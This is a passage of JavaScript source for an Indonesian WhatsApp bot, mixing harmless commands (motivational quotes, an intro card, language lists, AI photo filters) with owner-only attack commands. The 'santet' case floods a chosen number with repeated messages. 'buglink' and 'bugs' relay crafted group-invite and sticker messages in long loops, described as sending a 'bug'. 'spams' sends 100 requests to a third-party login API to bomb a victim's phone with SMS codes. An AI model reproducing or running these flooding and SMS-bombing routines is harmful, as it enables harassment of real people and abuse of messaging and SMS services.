  "Waktu lebih berharga daripada uang. Kamu bisa mendapatkan lebih banyak uang, tetapi kamu tidak bisa mendapatkan lebih banyak waktu",
  "Jenius adalah satu persen inspirasi dan sembilan puluh sembilan persen keringat",
  "Lakukan apa yang harus kamu lakukan sampai kamu dapat melakukan apa yang ingin kamu lakukan",
  "Kegagalan tidak akan pernah menyusul jika tekad untuk sukses cukup kuat",
  "Optimistis adalah salah satu kualitas yang lebih terkait dengan kesuksesan dan kebahagiaan daripada yang lain",
  "Tidak ada kata terlambat untuk menjadi dirimu yang seharusnya",
  "Kesempatan itu mirip seperti matahari terbit. Kalau kau menunggu terlalu lama, kau bisa melewatkannya",
  "Daripada mengeluh tentang keadaanmu, sibuklah dan buat beberapa yang baru",
  "Pengalaman adalah guru yang berat karena dia memberikan tes terlebih dahulu, kemudian pelajarannya",
  "Orang pesimis melihat kesulitan di setiap kesempatan. Orang yang optimis melihat peluang dalam setiap kesulitan",
  "Berani bermimpi, tapi yang lebih penting, berani melakukan tindakan di balik impianmu",
  "Jika rencananya tidak berhasil, ubah rencananya bukan tujuannya",
  "Ketekunan gagal 19 kali dan berhasil pada kesempatam yang ke-20",
  "Waktu lebih berharga daripada uang. Kamu bisa mendapatkan lebih banyak uang, tetapi kamu tidak bisa mendapatkan lebih banyak waktu",
  "Cara terbaik untuk memulai adalah dengan berhenti berbicara dan mulai melakukan",
  "Jangan tunda pekerjaanmu sampai besok, sementara kau bisa mengerjakannya hari ini",
  "Tetapkan tujuan Anda tinggi-tinggi, dan jangan berhenti sampai Anda mencapainya",
  "Lakukan lebih banyak untuk dunia daripada untuk dirimu"
]
const motivasi = motiv[Math.floor(Math.random() * motiv.length)]
m.reply(`${motivasi}`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'santet' : case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '🌿': case '🍀': case '☘️': {
 if (!isCreator) return m.reply('Maaf, lu siapa?🗿')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
if (args[0].startsWith(ownerNumber)) return m.reply('Ngapain Mau Kirim Ke Owner? Lu Mau Gw Spam?')
m.reply('Prosess Bosku') 
juna.sendMessage(Pe, {text: `Punten Goput`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `Tess Bang`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `Uhuyyyy`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `Slebeww`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `Anjayy`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `Sikatt Mangg`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${setting.botName}`}, {quoted:junaa})
await sleep(2000)
}
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
case "buglink":
if (!isCreator) return
Pe = text+'@s.whatsapp.net'
var groupInvite = generateWAMessageFromContent(Pe, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "6288239620884-1626256984@g.us",
"inviteCode": "sfeVFOlWvlo5Hd9x",
"inviteExpiration": "166659839399999",
"groupName": `𝑪𝑶𝑴𝑼𝑵𝑰𝑻𝒀 𝑪𝑳𝑨𝒀(𝑪𝒍𝒐𝒘𝒏𝒔 𝑳𝒂𝒖𝒈𝒉 𝑨𝒕 𝒀𝒐𝒖)©️${ngazap(prefix)}`,
"jpegThumbnail": "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",
"caption": `*https://wa.me/settings*\nMAKIMA - BOT ${ngazap(prefix)}`,
}
}), { userJid: Pe, quoted: m })
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(500)
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
break
case 'bugs':
if (!isCreator) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `MAKIMA - BOT`
for (let i = 0; i < jumlah; i++) {
juna.sendMessage(m.chat, {sticker: {url: `${setting.pathimg}`}},{'quoted': {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
break
case 'spams': {
if (!isCreator) return m.reply('*khusus Owner*')
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
if (froms.startsWith('+6285600793871')) return reply('Tidak bisa spam ke nomor ini!')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS)`);
});
}
} else m.reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +6281214281312`)
m.reply(`spam sms/call akan di kirim ke no target`)
}
break
case 'juna':{
if (!isCreator) return m.reply('Lu siapa dah?')
juna.sendMessage(m.chat, {
    'text': 'Iya'
  }, {
    'quoted': junaa
  })
  }
break
case 'intro':{
var intro =`ཻུꦽꦼ̷⸙‹•══════════════♡᭄
│       *「 Kartu Intro 」*
│ *Nama     :* 
│ *Gender   :* 
│ *Umur      :* 
│ *Hobby    :* 
│ *Kelas      :* 
│ *Asal         :* 
│ *Agama    :* 
|  *Status     :* 
╰═════ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙
`
juna.sendMessage(m.chat, {text: intro }, {quoted: fkontak})
}
break
case'totalfitur': case'fiturtotal': {
juna.sendMessage(m.chat, {text: `*Total fitur:* 939\n*Total Error:* 26\n*Fitur Online:* 913`}, {quoted: fkontak})
}
break
case'tes': case'test':
addCountCmd('tes', m.sender, _cmd)
juna.sendMessage(m.chat, {text: `*${setting.botName}* Online!\n\n*Waktu Online* :\n${runtime(process.uptime())}`}, {quoted: fkontak})
break
case 'bokep': {
const fs = require('fs');
if (!m.isGroup)return m.reply(mess.OnlyGrup)
if (!isCreator&&!isPremium) return m.reply('Tobat Bro Jangan Bokep Mulu:v')
await m.reply(mess.wait)
let istighfar = fs.readFileSync('./media/Astaghfirullah.mp4')
let ban = m.mentionedJid[0] || m.sender || conn.parseMention(args[0]) || (text.replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
await juna.sendFile(ban, istighfar, 'astagfirullah.mp4', `Tobat Broo:v`, m)
return m.reply(`Silahkan Cek Di Private Chat:v`) 
}
break
case 'listbahasa':
addCountCmd('listbahasa', m.sender, _cmd)
var clear = ["auto", "isSupported", "getCode"]
var teks = `List Bahasa Yang Tersedia\n\n`
for (let i in translate.languages) {
if (!clear.includes(i)) {
teks += `*${i}* untuk ${translate.languages[i]}\n`
}
}
m.reply(teks)
break
case 'differentme': {//fix bug 
if (!isCreator&&!isPremium) return m.reply(mess.OnlyPrem)
if (!quoted) return m.reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return m.reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
m.reply('Proses Ayangg')
try{
const media = await juna.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
const img = await fetch (`https://skizo.tech/api/aimirror?&url=${anu}&filter=${text}`) 
const p = await img.json()
if (p.status !== 200) throw 'Mana gakada'
const imgs = p.generated_image_addresses
const capt = p.time_processing
juna.sendMessage(m.chat, { image: { url: imgs }, caption: `Done Bruh\nWaktu Selesai ${capt}`}, { quoted: m})
}catch (error) {
m.reply(`Masukkan Nama Filter Yang Valid!\nAtau gunakan foto lain\nList Filter :\n- anime_2d\n- cartoon_3d\n- pretty_soldier\n- bizarre\n- romance_comic\n- maid_dressing\n- superhero_comic\n- watercolor\n- doodle\n- america_comic\n- starry_girl`)
}
}
break
case 'differentme2': {//fix bug 
if (!isCreator&&!isPremium) return m.reply(mess.OnlyPrem)
if (!quoted) return m.reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return m.reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
m.reply('Proses Ayangg')
try{
const media = await juna.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
